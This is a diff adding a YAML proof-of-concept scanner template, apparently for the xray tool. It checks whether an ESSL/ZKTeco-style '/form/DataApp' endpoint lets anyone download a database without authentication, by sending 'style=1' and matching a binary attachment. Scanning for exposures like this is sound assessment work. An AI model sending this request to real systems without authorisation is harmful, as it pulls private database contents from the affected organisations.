@@ -1,0 +1,19 @@
+name: poc-yaml-essl-dataapp-unauth-db-leak
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /form/DataApp
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: style=1
+            follow_redirects: false
+        expression: response.status == 200 && response.content_type.contains("application/binary") && response.body.bcontains(b"ZK") && response.headers["Content-Disposition"].contains("attachment")
+expression: r0()
+detail:
+    author: sharecast
+    links:
+        - https://nosec.org/home/detail/3032.html
